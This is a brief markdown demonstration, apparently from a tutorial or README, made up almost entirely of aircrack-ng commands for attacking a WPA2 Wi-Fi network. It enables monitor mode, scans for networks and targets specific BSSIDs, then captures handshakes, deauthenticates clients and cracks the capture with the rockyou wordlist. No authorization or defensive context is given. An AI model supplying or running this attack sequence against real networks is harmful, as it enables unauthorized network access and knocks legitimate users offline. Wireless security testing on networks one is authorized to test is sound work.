## Demonstration

### View Network Interfaces
```bash
ifconfig
```

### Start Monitor Mode on `wlan0`
```bash
airmon-ng start wlan0
```

### Kill Interfering Processes
```bash
airmon-ng check kill
```

### Confirm Monitor Mode
```bash
iwconfig
```

### Start Scanning for Wi-Fi Networks
```bash
airodump-ng -i wlan1
```

### Target Specific BSSID and Channel
```bash
airodump-ng --bssid 8E:F5:A3:77:D6:DB -c 3 -- wlan0
airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan1
```

### Deauthentication Attack (Kick Clients Out)
```bash
aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan1
aireplay-ng -0 20 -a F8:0C:58:B7:4C:51 wlan1
```

### Brute Force Attack
```bash
aircrack-ng -a2 -b F8:0C:58:B7:4C:51 -w /home/kali/Desktop/rockyou.txt /home/kali/Desktop/wpa2/-01.cap
```

### Stop Monitor Mode
```bash
airmon-ng stop wlan1

sudo service network-manager restart

sudo systemctl restart NetworkManager

```
